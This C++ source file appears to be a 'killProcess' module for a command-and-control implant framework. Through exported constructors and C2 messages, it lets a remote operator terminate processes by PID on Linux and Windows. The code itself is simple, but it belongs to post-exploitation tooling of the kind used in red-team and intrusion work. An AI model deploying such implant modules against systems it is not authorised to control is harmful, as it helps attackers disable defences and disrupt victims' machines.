#include "KillProcess.hpp"

#include "Common.hpp"

#include <cstring>
#ifdef __linux__
#include <signal.h>
#include <unistd.h>
#elif _WIN32
#include <windows.h>
#endif

using namespace std;

constexpr std::string_view moduleName = "killProcess";
constexpr unsigned long long moduleHash = djb2(moduleName);

#ifdef _WIN32
__declspec(dllexport) KillProcess* KillProcessConstructor()
{
    return new KillProcess();
}
#else
__attribute__((visibility("default"))) KillProcess* KillProcessConstructor()
{
    return new KillProcess();
}
#endif

KillProcess::KillProcess()
#ifdef BUILD_TEAMSERVER
    : ModuleCmd(std::string(moduleName), moduleHash)
#else
    : ModuleCmd("", moduleHash)
#endif
{
}

KillProcess::~KillProcess()
{
}

std::string KillProcess::getInfo()
{
    std::string info;
#ifdef BUILD_TEAMSERVER
    info += "killProcess Module:\n";
    info += "Terminate a process by PID.\n";
    info += "\nUsage:\n";
    info += " - killProcess <pid>\n";
#endif
    return info;
}

int KillProcess::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
{
#if defined(BUILD_TEAMSERVER) || defined(BUILD_TESTS)
    if (splitedCmd.size() >= 2)
    {
        c2Message.set_instruction(splitedCmd[0]);
        c2Message.set_pid(std::stoi(splitedCmd[1]));
    }
    else
    {
        c2Message.set_returnvalue(getInfo());
        return -1;
    }
#endif
    return 0;
}

#define ERROR_KILL_PROCESS 1
int KillProcess::process(C2Message &c2Message, C2Message &c2RetMessage)
{
    int pid = c2Message.pid();
    c2RetMessage.set_instruction(c2RetMessage.instruction());
    c2RetMessage.set_pid(pid);
#ifdef __linux__
    if (kill(pid, SIGKILL) == 0)
    {
        c2RetMessage.set_returnvalue("Killed.");
    }
    else
    {
        c2RetMessage.set_errorCode(ERROR_KILL_PROCESS);
    }
#elif _WIN32
    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
    if (hProcess)
    {
        BOOL ok = TerminateProcess(hProcess, 1);
        CloseHandle(hProcess);
        if (ok)
            c2RetMessage.set_returnvalue("Killed.");
        else
            c2RetMessage.set_errorCode(ERROR_KILL_PROCESS);
    }
    else
    {
        c2RetMessage.set_errorCode(ERROR_KILL_PROCESS);
    }
#endif
    return 0;
}

int KillProcess::errorCodeToMsg(const C2Message &c2RetMessage, std::string& errorMsg)
{
#ifdef BUILD_TEAMSERVER
    if (c2RetMessage.errorCode() == ERROR_KILL_PROCESS)
        errorMsg = "Failed: Could not kill process";
#endif
    return 0;
}
